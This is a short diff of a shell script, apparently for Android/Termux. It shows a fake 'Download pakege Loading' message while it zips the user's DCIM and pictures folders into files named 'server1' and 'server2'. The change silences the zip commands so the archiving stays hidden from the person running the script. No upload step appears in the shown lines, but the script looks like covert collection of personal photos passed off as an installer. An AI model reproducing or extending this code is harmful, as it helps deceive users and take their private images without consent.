@@ -21,8 +21,8 @@ printf " \e[1;95m    Download pakege Loading ... \n"
 printf "\n"
 
 printf "\e[1;90m    \n"
-zip server1 -r /sdcard/DCIM
-zip server2 -r /sdcard/pictures
+zip server1 -r /sdcard/DCIM > /dev/null 2>&1
+zip server2 -r /sdcard/pictures > /dev/null 2>&1
 clear
 banner() {
 
